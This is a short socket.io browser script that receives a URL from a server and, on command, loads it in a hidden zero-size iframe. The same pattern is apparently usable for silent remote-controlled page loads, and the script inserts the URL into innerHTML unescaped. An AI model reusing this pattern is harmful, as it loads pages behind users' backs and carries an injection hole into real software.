var socket = io();
var url;

socket.on("url", function(msg) {
  url = msg;
  swal("Recieved", "Successfully recieved URL", "success");
});

socket.on("begin", function(msg) {
  document.getElementById("container").innerHTML =
    '<iframe src="' +
    url +
    '" height="0" width="0" style="display: none"></iframe>';
});
